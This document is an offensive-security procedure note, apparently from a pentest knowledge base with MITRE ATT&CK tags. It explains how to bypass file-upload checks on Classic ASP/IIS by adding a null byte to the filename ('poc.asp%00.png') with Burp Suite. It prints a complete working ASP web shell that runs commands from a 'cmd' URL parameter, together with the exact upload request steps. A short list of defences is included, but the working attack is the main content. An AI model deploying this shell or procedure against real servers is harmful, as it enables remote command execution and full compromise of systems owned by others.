---
tags:
  - file-upload
  - null-byte
  - webshell
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:23:41.455Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: bc27a507-2807-422c-9a90-71777ccb0cfa
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
  - '[[Exploit Public-Facing Application]]'
---
# Upload-Malicious-ASP-Shell-with-Null-Byte-Bypass

## Summary

This procedure exploits an unrestricted file upload vulnerability by appending a null byte (%00) to the filename, allowing an executable ASP shell to be saved as '.asp' despite a safe extension like '.png', enabling persistence and future RCE.

## Description

The web repository's file validation fails to handle null bytes properly, truncating the filename at %00 on the server side (common in older Windows/IIS setups). The payload is an ASP script that uses WScript.Shell to execute commands from a URL parameter. Uploaded to '/savefiles/', it disguises as an image but runs as executable code. Prerequisites include access to the upload endpoint; outcomes include shell deployment leading to full server compromise.

## Requirements

1. Access to the upload endpoint from Step 1
2. Burp Suite for request interception and modification
3. Crafted ASP shell payload (e.g., code creating WScript.Shell object)
4. Target running Classic ASP on IIS without strict MIME type checks

## Defense

Defensive measures and detection strategies:

- Validate filenames server-side, stripping or rejecting null bytes and multiple extensions
- Restrict uploaded file types to safe MIME types and scan for executable code
- Monitor upload logs for suspicious filenames (e.g., containing %00) and anomalous 500 responses

## Objectives

1. Bypass extension blacklisting/whitelisting
2. Persist malicious ASP file on server
3. Set up for command execution

## Instructions

### Step 1: Prepare Payload

**Context**: Create the ASP shell code for command execution.

The payload should include:

```asp
<%
Function getCommandOutput(theCommand)
    Set objShell = CreateObject("WScript.Shell")
    Set objExec = objShell.Exec(theCommand)
    getCommandOutput = objExec.StdOut.ReadAll()
End Function
szCMD = Request("cmd")
If szCMD <> "" Then
    Response.Write getCommandOutput("cmd /c " & szCMD)
End If
%>
```

> Save this as the file content for upload.

### Step 2: Intercept and Modify Upload

**Context**: Use Burp to alter the filename with null byte.

Submit a normal upload via the form, intercept in Burp Repeater. Change filename to 'poc.asp%00.png' in the multipart/form-data body, POST to '/repo/orbital/repo.asp?fileToUpload=pizza.asp'.

> Expected output: Server 500 error, but verify upload by checking /savefiles/ for 'poc.asp'.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Remote File Copy]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[file-upload]]
- [[null-byte]]
- [[webshell]]
